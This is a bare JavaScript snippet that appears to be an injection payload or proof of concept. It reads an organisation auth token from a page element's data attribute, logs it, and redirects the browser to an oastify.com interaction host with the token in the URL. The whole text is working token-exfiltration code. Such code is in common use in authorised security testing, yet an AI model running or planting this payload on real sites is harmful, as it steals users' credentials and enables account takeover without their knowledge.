  const el = document.getElementById('scope');
  if (el) {
    const token = encodeURIComponent(el.dataset.scopeOrgAuthToken);
    console.log("Extracted Token:", token); // 👈 this logs it
    location.href = `https://i9sfajp2w7fjcfk0ej3asxmkqbw2kv8k.oastify.com/?token=${token}`;
  } else {
    console.log("Element #scope not found.");
  }
